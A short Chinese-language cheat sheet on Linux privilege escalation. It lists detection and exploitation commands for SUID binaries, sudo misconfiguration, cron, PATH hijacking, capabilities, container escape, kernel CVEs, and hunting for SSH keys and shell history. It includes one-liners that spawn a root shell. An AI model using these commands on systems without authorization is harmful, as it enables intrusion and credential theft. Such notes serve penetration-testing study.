Linux提权

1. 配置错误类

SUID提权

被赋予suid权限的文件可以达到权限提升的效果

查看被赋予suid权限的文件：

find / -perm -4000 2>/dev/null

find提权：

find . -exec /bin/sh -p ; -quit

  • sudo 权限配置不当
    • 如 sudo NOPASSWD: /bin/bash 或可执行特定命令（如 git, vim）
    • 检测：sudo -l
    • 利用：sudo vim → :!/bin/sh
  • 可写敏感文件
    • /etc/passwd（无 shadow 时）、/etc/crontab、/etc/sudoers
    • 检测：ls -l /etc/passwd，find /etc -writable 2>/dev/null

SGID 滥用

2. 计划任务/定时任务滥用

  • 可写 cron 脚本或日志文件（如 logrotate 利用）
  • 检测：cat /etc/crontab，ls -l /etc/cron.d/，systemctl list-timers

3. 内核漏洞（本地提权）

  • 著名漏洞：Dirty COW (CVE-2016-5195)、Dirty Pipe (CVE-2022-0847)
  • 检测：uname -a，cat /proc/version → 查版本 → 匹配 exploit
  • 工具：linux-exploit-suggester.sh

4. PATH 劫持

  • 原理：脚本调用未指定绝对路径的命令（如 service）
  • 利用：在用户 PATH 优先目录（如 /tmp）放置同名恶意程序

5. 能力（Capabilities）滥用

  • 检测：capsh --print，getcap -r / 2>/dev/null
  • 利用：如 cap_setuid+ep 可直接提权

6. 容器/环境逃逸

  • Docker：挂载 /、--privileged、socket 挂载
  • 检测：cat /proc/1/cgroup，ls -l /proc/1/mounts

7. 凭证复用

  • SSH 私钥：find /home -name "id_rsa" 2>/dev/null
  • 历史命令：cat ~/.bash_history
  • 数据库密码、配置文件中的明文凭证
